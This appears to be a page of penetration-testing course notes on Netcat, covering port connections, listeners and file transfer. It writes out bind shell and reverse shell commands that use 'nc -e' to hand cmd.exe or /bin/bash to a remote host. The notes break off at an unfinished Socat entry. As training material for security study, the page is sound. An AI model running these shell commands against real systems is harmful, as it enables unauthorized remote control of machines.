---
description: Practical Tools
---

# Chapter 4

* **Netcat** - versatile network penetration testing tool, reads and writes data across network connections using TCP or UDP protocols.
  * client or server mode
  * Connecting to TCP/UDP Port
    * e.g.     nc -n -v 10.11.0.22 110
  * Listening to TCP/UDP Port
    * e.g.     rdesktop to connect,
    * e.g.     nc -nvlp 4444
  * Transferring Files
    * e.g.     nc -nvlp 4444 > incoming.exe
    * e.g.     nc -nv 10.11.0.22 4444 < wget.exe(location)
  * Remote Administration
    * \-e redirects input, output, and errors to TCP/UDP port
      * e.g.     NC Bind shell scenario
        * nc -nvlp 4444 -e cmd.exe
          * bind port 4444 to cmd.exe and output messages to the network

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>Netcat bind shell scenario</p></figcaption></figure>

* nc -nv 10.11.0.22 4444 -e /bin/bash
  * Alice's netcat will redirect /bin/bash input, output and error data streams to Bob's machine on port 4444

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>Netcat reverse shell scenario</p></figcaption></figure>

* **Socat** -&#x20;
